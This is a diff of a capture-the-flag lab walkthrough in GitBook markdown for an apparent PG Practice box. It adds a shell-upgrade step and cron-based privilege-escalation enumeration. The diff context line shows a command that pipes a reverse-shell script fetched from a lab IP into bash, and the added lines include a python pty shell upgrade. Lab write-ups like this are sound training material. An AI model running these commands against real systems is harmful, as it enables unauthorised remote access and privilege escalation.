@@ -116,9 +116,32 @@ curl 192.168.49.90/rev_shell | bash
 
 <figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
+<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption><p>Terminator Command Window</p></figcaption></figure>
+
+Upgrade Shell:
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+* Time to priv esc!
+
 ## Privilege Escalation
 
 ### Local enumeration
+
+<mark style="color:yellow;">Cronjobs</mark>
+
+```
+cat /etc/crontab
+```
+
+<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+* <mark style="color:yellow;">/opt/image-exif.sh</mark> looks interesting
+* I tried to replace the file and delete it with no luck
+
+{% embed url="https://grumpygeekwrites.wordpress.com/2021/09/07/offensive-security-pg-practice-exfiltrated-walk-through-tutorial-writeup/" %}
 
 ### PrivEsc vector
 
